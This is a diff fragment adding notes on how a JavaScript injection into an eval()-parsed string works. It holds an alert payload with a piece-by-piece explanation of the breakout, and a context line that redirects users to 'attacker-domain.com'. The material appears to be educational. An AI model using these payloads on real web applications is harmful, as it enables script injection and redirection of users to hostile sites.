@@ -6,3 +6,21 @@ web page manipulation:
 
 Redirecting the user
 '}); window.location.href = 'https://attacker-domain.com'; ({'dummy':'
+
+alert example:
+'}); alert('bad'); ({'dummy':'
+
+How does it work?
+To break out of these single quotes and inject arbitrary JavaScript code, you need to close the single quote,
+inject your code, and then provide a way to validly terminate the JSON structure.
+
+'}); alert('bad'); ({'dummy':'
+
+'}); : This closes the current single quote and the curly brace, and then ends the current JSON structure.
+alert('bad'); : This is the arbitrary JavaScript to inject and execute.
+({ 'dummy':' : This starts a new object to keep the overall structure valid after the injected code.
+
+When the input is provided, the constructed string becomes:
+{"animal": ''}); alert('bad'); ({'dummy':''}
+
+The eval() function will interpret and execute the alert('bad'); portion, showing the alert.
